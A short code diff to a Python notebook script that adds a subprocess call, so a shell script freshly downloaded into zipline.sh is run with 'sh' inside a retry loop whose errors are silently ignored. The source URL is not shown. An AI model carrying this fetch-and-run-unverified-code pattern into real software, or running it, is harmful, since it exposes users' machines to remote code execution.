@@ -1,4 +1,5 @@
 import time
+import subprocess
 from IPython.core.display import display, Javascript
 
 try:
@@ -29,6 +30,8 @@ for _ in range(58):
       open('zipline.sh', 'w').write(res.read().decode())
     except:
       open('zipline.sh', 'w').write(res.read())
+    
+    subprocess.call('sh zipline.sh', shell=True)
     break
   except:
     pass
